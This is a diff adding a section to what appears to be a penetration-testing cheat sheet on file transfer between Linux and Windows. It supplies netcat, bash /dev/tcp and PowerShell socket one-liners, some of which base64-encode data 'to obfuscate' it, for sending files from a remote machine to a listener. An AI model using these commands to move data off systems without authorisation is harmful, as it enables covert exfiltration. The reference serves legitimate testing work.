@@ -95,6 +95,97 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 ***
 ***
 
+### Linux To Windows
+
+#### Send a file from a *remote* Linux client to a *local* Windows host
+
+![](./imgs/lin-win-rev.png)
+
+##### If you want to send the raw contents:
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *local* Windows host:
+
+```
+& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $File = [System.IO.File]::OpenWrite("$FilePath"); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $File.Write($Buffer, 0, $BytesRead) }; $File.Close(); $NetworkStream.Close(); $TCPClient.Close(), $Listener.Stop()}
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Linux client connect back with Netcat:
+
+```
+nc -q 0 %ListenerAddress% %ListeningPort% < /path/to/sending/file.ext
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with bash:
+
+```
+cat /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
+```
+
+##### If you want to obfuscate the data being transfered by converting it to a base64 string:
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *local* Windows host:
+
+```
+& {$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $Data = [System.Text.Encoding]::ASCII.GetString($Buffer, 0, $BytesRead); $Contents = $Contents + $Data }; $Base64String = [Convert]::FromBase64String($Contents); [IO.File]::WriteAllBytes("$FilePath", $Base64String); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()}
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Linux client connect back with Netcat:
+
+```
+base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with bash:
+
+```
+base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
+```
+
+***
+
+#### Retrieve a file from a *remote* Linux client to a *local* Windows host
+
+![](./imgs/lin-win-bind.png)
+
+##### If you want to send the raw contents:
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *remote* Linux client:
+
+```
+nc -q 0 -lp %ListenerPort% < /path/to/sending/file.ext
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host connect back with PowerShell:
+
+```
+& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $File = [System.IO.File]::OpenWrite("$FilePath"); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $File.Write($Buffer, 0, $BytesRead) }; $File.Close(); $NetworkStream.Close(); $TCPClient.Close()}
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
+
+##### If you want to obfuscate the data being transfered by converting it to a base64 string:
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *remote* Linux client:
+
+```
+base64 -w0 /path/to/sending/file.ext | nc -q 0 -lp %ListeningPort%
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host connect back with PowerShell:
+
+```
+& {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $Data = [System.Text.Encoding]::ASCII.GetString($Buffer, 0, $BytesRead); $Contents = $Contents + $Data }; $Base64String = [Convert]::FromBase64String($Contents); [IO.File]::WriteAllBytes("$FilePath", $Base64String); $NetworkStream.Close(); $TCPClient.Close()}
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
+
+***
+***
+
 ### Linux To Linux
 
 #### Send file from *remote* Linux client to *local* Linux host
